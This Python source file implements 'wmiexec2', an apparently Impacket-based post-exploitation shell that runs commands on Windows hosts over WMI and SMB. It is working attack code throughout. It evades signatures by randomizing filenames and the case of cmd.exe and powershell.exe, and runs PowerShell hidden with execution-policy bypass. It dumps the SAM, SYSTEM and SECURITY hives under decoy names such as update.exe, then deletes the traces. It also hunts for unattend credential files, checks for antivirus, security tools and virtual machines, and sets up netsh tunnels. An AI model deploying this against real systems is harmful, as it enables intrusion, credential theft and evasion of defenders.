from __future__ import division
from __future__ import print_function
import sys
import os
import cmd
import random
import string
from termcolor import cprint
import time
import logging
import ntpath
from base64 import b64encode
from six import PY2


def random_sig():
    """
    Function will create a random file name to store the command output before it is read in and returned back to the user

    Return: random file name to avoid signatures, or at least limit signature exposure
    """
    guid_or_not = random.randint(1,10)
    if guid_or_not % 2 == 0:

        rand_length = random.randint(8, 32)
        if rand_length % 2 == 0:
            guid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=rand_length))
            guid2 = list(''.join(l + '-' * (n % 4 == 2) for n, l in enumerate(guid)))
            return '{' + ''.join(guid2) + '}'
        else:
            guid = list(''.join(random.choices(string.ascii_uppercase + string.digits, k=rand_length)))
            guid2 = list(''.join(l + '-' * (n % 4 == 2) for n, l in enumerate(guid)))
            return '{' + ''.join(guid2) + '}'
    else:

        rand_length = random.randint(8, 32)
        if rand_length % 2 == 0:
            guid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=rand_length))
            guid2 = list(''.join(l + '-' * (n % 4 == 2) for n, l in enumerate(guid)))
            return ''.join(guid2)
        else:
            guid = list(''.join(random.choices(string.ascii_uppercase + string.digits, k=rand_length)))
            guid2 = list(''.join(l + '-' * (n % 4 == 2) for n, l in enumerate(guid)))
            return ''.join(guid2)



OUTPUT_FILENAME = random_sig()
CODEC = sys.stdout.encoding


def temp_perm(option):
    """
    Function will create a permutation on the Temp directory altering it case

    Return: a random case on Temp
    """
    letters_dir = ['t', 'e', 'm', 'p']
    letters_cmd = ['c', 'm', 'd', '.', 'e', 'x', 'e']
    letters_power = ['p', 'o', 'w', 'e', 'r', 's', 'h', 'e', 'l', 'l', '.', 'e', 'x', 'e']
    final_arr = []
    if option == "dir":
        for i in letters_dir:
            rand_num = random.randint(1, 2)
            if rand_num == 1:
                final_arr.append(i.upper())
            else:
                final_arr.append(i.lower())
    elif option == "cmd":
        for i in letters_cmd:
            rand_num = random.randint(1, 2)
            if rand_num == 1:
                final_arr.append(i.upper())
            else:
                final_arr.append(i.lower())
    elif option == "power":
        for i in letters_power:
            rand_num = random.randint(1, 2)
            if rand_num == 1:
                final_arr.append(i.upper())
            else:
                final_arr.append(i.lower())

    else:
        pass
    return ''.join(final_arr)


class RemoteShell(cmd.Cmd):
    def __init__(self, share, win32Process, smbConnection, shell_type, silentCommand=False):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__output = '\\' + temp_perm("dir") + '\\' + OUTPUT_FILENAME
        print(f"[*] Output Filename: {self.__output}")
        self.__outputBuffer = str('')
        self.__shell = temp_perm("cmd") + ' /Q /c '
        self.__shell_type = shell_type
        # call function here that will generate random encoding schemes here
        # -NOL --> No Logo
        # -NOP --> No execution profile
        # -STA --> Single Threaded Apartment
        # -NONI --> Non interactive
        # -W --> Window Style needs Hidden After
        # -Exec --> Needs bypass after
        # -Enc --> Encoded command
        self.__pwsh = temp_perm("power") + ' -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__silentCommand = silentCommand
        self.__pwd = str('C:\\')
        self.__noOutput = False
        self.intro = '[*] **Launching wmiexec2**\n[*] Press help for extra shell commands'

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(100000)
            self.do_cd('\\')
        else:
            self.__noOutput = True

        # If the user wants to just execute a command without cmd.exe, set raw command and set no output
        if self.__silentCommand is True:
            self.__shell = ''

    def format_print_buff(self):
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print(self.__outputBuffer)
            self.__outputBuffer = ''

    def do_shell(self, s):
        os.system(s)

    def do_help(self, line):
        print("""
 --------------------------------------------------------------------------------------------
 + Basic Module                                                                            +  
 --------------------------------------------------------------------------------------------
  CRTL+L                      - clear screen
  sysinfo                     - see basic information about the host
  lcd {path}                  - changes the current local directory to {path}
  exit                        - terminates the server process (and this session)
  lput {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current dir)
  lget {file}                 - downloads pathname to the current local dir
  ! {cmd}                     - executes a local shell cmd
  cat                         - view file contents
  ls                          - you should know this, will show hidden files 
 --------------------------------------------------------------------------------------------
 + Process Accounting                                                                      +
 --------------------------------------------------------------------------------------------
  av                        - looks for Anti-Virus solutions running in the process list
  defender                  - query Microsoft Defender status
  vmcheck                   - attempts to detect if we are running in a vm
  securitytools             - looks for security researcher tools in the process list 
 --------------------------------------------------------------------------------------------
 + Credential Harvesting                                                                    +
 --------------------------------------------------------------------------------------------
  unattend                   - find all unattended files (potential base64 credentials)
  regrip                     - save sam, security, system to target pwd
  creds                      - enumerate LSA Protection, WDigest, Credential Guard, Cached 
                               logon count 
 --------------------------------------------------------------------------------------------
 + Tunneling                                                                               + 
 --------------------------------------------------------------------------------------------
  showtun                   - see all tunnels
  addtun                    - add tunnel --> addtun lport rhost rport --> 10000 10.0.0.1 443
  deltun                    - delete tunnel --> deltun lport --> deltun 11000  
 --------------------------------------------------------------------------------------------
 + Collection                                                                               +
 --------------------------------------------------------------------------------------------
  loggrab                   - collects log of your choice --> loggrab Security.evtx 
  survey                    - performs host survey of target, saves output to local machine
 --------------------------------------------------------------------------------------------
 + Priv Esc                                                                                 +
 --------------------------------------------------------------------------------------------
  tokens                    - enumerate enabled tokens for priv esc path
  """)

    def do_survey(self, s):
        save_local_option = s.split(" ")[0]
        if save_local_option == "save":
            try:
                logging.info("Saving all output from survey to survey.txt in your local pwd")
                logging.info("Starting Survey")
                local_save_file = open("survey.txt", "a")

                config_file = open("survey.conf", "r+")
                current_line = config_file.readline()

                for item in config_file:
                    local_save_file.write("[*] %s \n" % (item))
                    self.execute_remote(item.strip('\n'))
                    time.sleep(1)
                    local_save_file.write(self.__outputBuffer.strip('\r\n') + '\n')
                    self.__outputBuffer = ''
                logging.info("Survey Completed")
            except Exception as e:
                print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
        else:
            try:
                logging.info("Starting Survey")
                config_file = open("survey.conf", "r+")
                current_line = config_file.readline()

                for item in config_file:
                    print("[*] %s" % (item))
                    self.execute_remote(item.strip('\n'))
                    time.sleep(1)
                    '''
                    if len(self.__outputBuffer.strip('\r\n')) > 0:
                        print(self.__outputBuffer)
                        self.__outputBuffer = ''
                    '''
                    self.format_print_buff()
                logging.info("Survey Completed")
            except Exception as e:
                print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))

    def do_loggrab(self, s):
        try:
            prefix = 'copy '
            log_file_name = s
            file_path = 'C:\Windows\System32\Winevt\Logs\\'
            remote_copy = ' C:\Windows\system32\spool\drivers\color'
            combined_command = prefix + '"' + file_path + s + '"' + remote_copy
            self.execute_remote(combined_command)
            logging.info(s)
            self.do_lget(remote_copy.lstrip() + '\\' + s)
            self.execute_remote("del" + remote_copy + '\\' + s)
            self.format_print_buff()
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))

    def do_mounts(self, s):
        try:
            self.execute_remote("wmic logicaldisk get description,name")
            find_description_start = "Description"
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                new_buff = self.__outputBuffer.split("codec")[0]
                print(new_buff)
                self.__outputBuffer = ''

        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))

    def do_sysinfo(self, s):
        try:
            logging.info("Target")
            self.execute_remote('whoami')
            self.format_print_buff()

            logging.info("Hostname")
            self.execute_remote('hostname')
            self.format_print_buff()

            logging.info("Arch: ")
            self.execute_remote('SET Processor | findstr /i "PROCESSOR_ARCHITECTURE"')
            self.format_print_buff()

            logging.info("IP Addresses: ")
            self.execute_remote('ipconfig /all | findstr /i "(Preferred)"')
            self.format_print_buff()

        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))

    def do_lcd(self, s):
        if s == '':
            print(os.getcwd())
        else:
            try:
                os.chdir(s)
            except Exception as e:
                logging.error(str(e))

    # add md5 before after 
    # add a progress bar. see how ivan does his 
    def do_lget(self, src_path):

        try:
            import ntpath
            newPath = ntpath.normpath(ntpath.join(self.__pwd, src_path))
            drive, tail = ntpath.splitdrive(newPath)
            filename = ntpath.basename(tail)
            fh = open(filename, 'wb')
            logging.info("Downloading %s\\%s" % (drive, tail))
            self.__transferClient.getFile(drive[:-1] + '$', tail, fh.write)
            fh.close()

        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))

            if os.path.exists(filename):
                os.remove(filename)

    def do_addtun(self, s):
        lport = s.split(" ")[0]
        rhost = s.split(" ")[1]
        rport = s.split(" ")[2]
        try:
            self.execute_remote(
                "netsh interface portproxy add v4tov4 listenport=%s connectport=%s connectaddress=%s" % (
                lport, rport, rhost))
            self.format_print_buff()
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))

    def do_showtun(self, s):
        try:
            self.execute_remote("netsh interface portproxy show v4tov4")
            self.format_print_buff()
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))

    def do_deltun(self, s):
        lport = s.split(" ")[0]
        try:
            self.execute_remote("netsh interface portproxy delete v4tov4 listenport=%s" % (lport))
            self.format_print_buff()
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))

    def do_ls(self, s):
        # see if user specified a dir or not
        if len(s) == 0:
            try:
                self.execute_remote('dir /A /N /O:D .')
                self.format_print_buff()
            except Exception as e:
                print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))
        else:
            path = s.split(" ")[0]
            try:
                self.execute_remote('dir /A /N /O:D %s' % path)
                self.format_print_buff()
            except Exception as e:
                print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))

    # add progress bar, see how ivan does his
    # add md5 before after 
    def do_lput(self, s):
        try:
            params = s.split(' ')
            if len(params) > 1:
                src_path = params[0]
                dst_path = params[1]
            elif len(params) == 1:
                src_path = params[0]
                dst_path = ''

            src_file = os.path.basename(src_path)
            fh = open(src_path, 'rb')
            dst_path = dst_path.replace('/', '\\')
            import ntpath
            pathname = ntpath.join(ntpath.join(self.__pwd, dst_path), src_file)
            drive, tail = ntpath.splitdrive(pathname)
            logging.info("Uploading %s to %s" % (src_file, pathname))
            self.__transferClient.putFile(drive[:-1] + '$', tail, fh.read)
            fh.close()
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))

    # fix this dumpster fire
    def do_av(self, s):
        try:
            self.execute_remote(
                'tasklist /svc | findstr /i "MsMpEng.exe WinDefend MSASCui.exe navapsvc.exe avkwctl.exe fsav32.exe mcshield.exe ntrtscan.exe avguard.exe ashServ.exe avengine.exe avgemc.exe tmntsrv.exe kavfswp.exe kavtray.exe vapm.exe avpui.exe avp.exe"')
            self.format_print_buff()
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))

    def do_defender(self, s):
        try:
            logging.info('Defender Install Location')
            self.execute_remote('reg query "HKLM\Software\Microsoft\Windows Defender" /F InstallLocation | findstr /i InstallLocation')
            self.format_print_buff()

            self.execute_remote('reg query "HKLM\Software\Microsoft\Windows Defender" /F IsServiceRunning')
            if "0x1" in self.__outputBuffer:
                logging.info('Defender Service is Running')
            elif "0x0" in self.__outputBuffer:
                logging.info('Defender Service is not Running')
            self.__outputBuffer = ''

            logging.info('Defender Process Exclusions')
            self.execute_remote('reg query "HKLM\Software\Microsoft\Windows Defender\Exclusions\Processes"')
            if len(self.__outputBuffer.strip('\r\n')) == 0:
                print('\tNo Process Exclusions')
            logging.info('Defender Path Exclusions')
            self.execute_remote('reg query "HKLM\Software\Microsoft\Windows Defender\Exclusions\Paths" | findstr /i REG_DWORD')
            self.format_print_buff()

            self.execute_remote('reg query "HKLM\Software\Microsoft\Windows Defender\Real-Time Protection" /F DisableRealtimeMonitoring')
            if "0x0" in self.__outputBuffer:
                logging.info('Real Time Protection is Enabled')
            elif "0x1" in self.__outputBuffer:
                logging.info('Real Time Protection is Disabled')
            self.__outputBuffer = ''

            self.execute_remote('reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /e /F TamperProtection')
            if "0x0" or "0x4" in self.__outputBuffer:
                logging.info('Tamper Protection is Disabled')
            elif "0x5" in self.__outputBuffer:
                logging.info('Tamper Protection is Enabled')
            else:
                logging.info('Unknown value set for Tamper Protection')
                self.format_print_buff()
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))



    # fix this output
    def do_tokens(self, s):
        self.execute_remote('whoami /priv | findstr /i "Enabled"')
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            if "SeImpersonatePrivilege" in self.__outputBuffer:
                cprint('[*] SeImpersonate Enabled:', 'green')
                print('\tJuicy-Potato\n\tRougeWinRM\n\tSweetPotato\n\tPrintSpoofer')
            if "SeBackupPrivilege" in self.__outputBuffer:
                cprint('[*] SeBackupPrivilege Enabled:', 'green')
                print('\thttps://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1\n\thttps://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug\n\thttps://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec')
            if "SeTakeOwnershipPrivilege" in self.__outputBuffer:
                cprint('[*] SeTakeOwnershipPrivilege Enabled:', 'green')
                print('\ttakeown /f "C:\windows\system32\config\SAM"\n\ticacls "C:\windows\system32\config\SAM" /grant <your_username>:F')
            if "SeDebugPrivilege" in self.__outputBuffer:
                cprint('[*] SeDebugPrivilege Enabled:', 'green')
                print('\tProcdump.exe on LSASS.exe, use mimikatz')
        else:
            logging.info("No Valuable Tokens Found")
        self.__outputBuffer = ''

    def do_creds(self, s):
        # WDigest
        self.execute_remote(
            "reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential")
        if "0x0" in self.__outputBuffer or "0" in self.__outputBuffer or "ERROR" in self.__outputBuffer:
            logging.info("WDigest is not enabled")
            self.__outputBuffer = ''
        else:
            logging.info("WDigest might be enabled --> LSASS clear text creds")
            self.format_print_buff()
        self.execute_remote("reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL")
        if "0x1" in self.__outputBuffer or "1" in self.__outputBuffer:
            logging.info("LSA Protection Enabled")
            self.__outputBuffer = ''
        else:
            logging.info("LSA Protection not enabled")
            self.__outputBuffer = ''
        self.execute_remote("reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags")
        if "0x0" in self.__outputBuffer or "ERROR" in self.__outputBuffer:
            logging.info("Credential Guard Probably not enabled")
            self.__outputBuffer = ''
        elif "0x1" or "1" in self.__outputBuffer:
            logging.info("Credential Guard active with UEFI lock")
            self.__outputBuffer = ''
        elif "0x2" or "2" in self.__outputBuffer:
            logging.info("Credential Guard enabled without UEFI lock")
            self.__outputBuffer = ''
        else:
            logging.info("Error: Couldnt enumerate Credential Guard")
        self.execute_remote(
            'reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT')
        if "10" in self.__outputBuffer:
            logging.info("Default of 10 cached logons")
            self.__outputBuffer = ''

        else:
            logging.info("Cached Logon Credential Amount")
            self.format_print_buff()

    def do_securitytools(self, s):
        logging.info("Security Researcher Tools: ")
        self.execute_remote(
            'tasklist /svc | findstr /i "pd64.exe ida64.exe ida32.exe x64dbg.exe x32dbg.exe hiew32.exe sysanalyzer.exe petools.exe dnSpy.exe lordpe.exe PE-bear.exe Procmon.exe Procmon64.exe Autoruns.exe Autoruns64.exe Dbgview.exe dbgview64.exe Diskmon.exe Diskmon64.exe portmon.exe procdump.exe procdump64.exe tcpview.exe tcpview64.exe procexp.exe procexp64.exe die.exe ProcessHacker.exe Wireshark.exe dumpcap.exe"')
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            self.format_print_buff()
        else:
            logging.info("No Security Researcher Processes Found")

    def do_vmcheck(self, s):
        try:
            logging.info("Common Processes: ")
            self.execute_remote(
                'tasklist /svc | findstr /i "vmtoolsd.exe VBoxTray.exe vboxservice.exe vmwaretray.exe vmwareuser.exe vmware.exe vmount2.exe VGAuthService.exe vmacthlp.exe vmsrvc.exe vmusrvc.exe prl_cc.exe prl_tools.exe prl_cc.exe xenservice.exe xsvc_depriv.exe joeboxserver.exe joeboxcontrol.exe qemu-ga.exe WPE Pro.exe"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                self.format_print_buff()
            else:
                logging.info("No VM Processes found")

            self.execute_remote('dir /B "C:\Program Files\VMware"')
            if "File Not Found" in self.__outputBuffer.strip('\r\n'):
                print("C:\Program Files\VMware Not Present")
                self.__outputBuffer = ''
            else:
                self.__outputBuffer = ''
                cprint('C:\Program Files\VMWare found', "red")
            self.execute_remote('systeminfo | findstr /i "Manufacturer:"')
            self.format_print_buff()
            logging.info("Virtual Box Detection")
            self.execute_remote("dir /B C:\Windows\System32\drivers\VBoxMouse.sys")
            self.execute_remote("dir /B C:\Windows\System32\drivers\VBoxGuest.sys")
            if "VBoxMouse.sys" or "VBoxGuest.sys" in self.__outputBuffer:
                print("[!] Found VBox Files:")
                cprint(self.__outputBuffer, "red")
            else:
                print(self.__outputBuffer.strip('\r\n'))
            self.__outputBuffer = ''

        except error as e:
            print("[!] Something went wrong, see below for error:\n", e)

    def do_cat(self, s):
        try:
            self.execute_remote('type ' + s)
            self.format_print_buff()
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))

    # an array, ever heard of one...
    def do_unattend(self, s):
        one = r"C:\unattend.txt"
        two = r"C:\unattend.inf"
        three = r"C:\Windows\sysprep.inf"
        four = r"C:\Windows\sysprep\sysprep.xml"
        five = r"C:\Windows\sysprep\sysprep.inf"
        six = r"C:\Windows\Panther\Unattended.xml"
        seven = r"C:\Windows\Panther\Unattend.xml"
        eight = r"C:\Windows\Panther\Unattend\Unattend.xml"
        nine = r"C:\Windows\Panther\Unattend\Unattended.xml"
        ten = r"C:\Windows\System32\Sysprep\unattend.xml"
        eleven = r"C:\Windows\System32\Sysprep\unattended.xml"

        try:
            logging.info("Looking for: %s, %s" % (one, two))
            self.execute_remote('dir C:\ | findstr /i "unattend.txt || unattend.inf"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                self.format_print_buff()
            else:
                print("Nothing Found")
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", e)

        try:
            logging.info("Looking for: %s" % (three))
            self.execute_remote("dir C:\Windows | findstr /i 'sysprep.inf'")
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                self.format_print_buff()
            else:
                print("Nothing Found")
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", e)

        try:
            logging.info("Looking for: %s, %s" % (four, five))
            self.execute_remote(r'dir C:\Windows\sysprep | findstr /i "sysprep.inf || sysprep.xml"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                self.format_print_buff()
            else:
                print("Nothing Found")
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", e)
        try:
            logging.info("Looking for: %s, %s" % (six, seven))
            self.execute_remote(r'dir C:\Windows\Panther | findstr /i "Unattended.xml || Unattend.xml"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                self.format_print_buff()
            else:
                print("Nothing Found")
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", e)

        try:
            logging.info("Looking for: %s, %s" % (eight, nine))
            self.execute_remote(r'dir C:\Windows\Panther\Unattend | findstr /i "Unattended.xml || Unattend.xml"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                self.format_print_buff()
            else:
                print("Nothing Found")
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", e)

        try:
            logging.info("Looking for: %s, %s" % (ten, eleven))
            self.execute_remote('dir C:\Windows\System32\Sysprep | findstr /i "unattend.xml || unattended.xml"')
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                self.format_print_buff()
            else:
                print("Nothing Found")
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", e)

    def do_regrip(self, s):
        try:
            logging.info("SAM")
            self.execute_remote(r'reg save "HK"L""M\s""a""m"" win32.dll')
            self.format_print_buff()
            logging.info("System")
            self.execute_remote(r'reg save "HK"L""M\s""ys""t"em" win32.exe')
            self.format_print_buff()
            logging.info("Security")
            self.execute_remote(r'reg save "HK"L""M\s""ec""u"rit"y"" update.exe')
            self.format_print_buff()
            self.do_lget("win32.dll")
            os.rename("win32.dll", "SAM")
            self.do_lget("win32.exe")
            os.rename("win32.exe", "System")
            self.do_lget("update.exe")
            os.rename("update.exe", "Security")
            self.execute_remote("del win32.dll")
            self.execute_remote("del win32.exe")
            self.execute_remote("del update.exe")
        except Exception as e:
            print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))

    def do_exit(self, s):
        return True

    def do_EOF(self, s):
        print()
        return self.do_exit(s)

    def emptyline(self):
        return False

    def do_cd(self, s):
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            self.format_print_buff()
        else:
            if PY2:
                self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s.decode(sys.stdin.encoding)))
            else:
                self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote('cd ')
            self.__pwd = self.__outputBuffer.strip('\r\n')
            self.prompt = (self.__pwd + '> ')
            if self.__shell_type == 'powershell':
                self.prompt = '\U0001F47B' + ' ' + 'PS ' + self.prompt + ' '
            self.__outputBuffer = ''

    def default(self, line):
        # Let's try to guess if the user is trying to change drive
        if len(line) == 2 and line[1] == ':':
            # Execute the command and see if the drive is valid
            self.execute_remote(line)
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                # Something went wrong
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                # Drive valid, now we should get the current path
                self.__pwd = line
                self.execute_remote('cd ')
                self.__pwd = self.__outputBuffer.strip('\r\n')
                self.prompt = (self.__pwd + '>')
                self.__outputBuffer = ''
        else:
            if line != '':
                self.send_data(line)

    def get_output(self):
        def output_callback(data):
            try:
                self.__outputBuffer += data.decode(CODEC)
            except UnicodeDecodeError:
                self.__outputBuffer += data.decode(CODEC, errors='replace')

        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >= 0:
                    # Output not finished, let's wait
                    time.sleep(1)
                    pass
                elif str(e).find('Broken') >= 0:
                    # The SMB Connection might have timed out, let's try reconnecting
                    logging.debug('Connection broken, trying to recreate it')
                    self.__transferClient.reconnect()
                    return self.get_output()
        self.__transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data, shell_type='cmd'):
        if shell_type == 'powershell':
            data = '$ProgressPreference="SilentlyContinue";' + data
            data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()

        command = self.__shell + data

        if self.__noOutput is False:
            # can you obfuscate this...
            command += ' 1> ' + '\\\\localhost\\%s' % self.__share + self.__output + ' 2>&1'
        if PY2:
            self.__win32Process.Create(command.decode(sys.stdin.encoding), self.__pwd, None)
        else:
            self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data, self.__shell_type)
        print(self.__outputBuffer)
        self.__outputBuffer = ''
